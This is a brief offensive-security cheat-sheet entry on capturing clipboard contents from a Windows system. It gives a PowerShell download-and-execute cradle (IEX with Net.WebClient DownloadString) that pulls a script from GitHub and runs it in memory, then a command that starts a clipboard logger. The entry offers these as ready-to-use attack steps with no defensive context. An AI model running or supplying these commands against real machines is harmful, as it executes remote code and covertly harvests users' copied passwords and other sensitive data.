# Extracting Clipboard data Windows

* script to get clipboard data from a windows system

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

```powershell-session
Invoke-ClipboardLogger
```
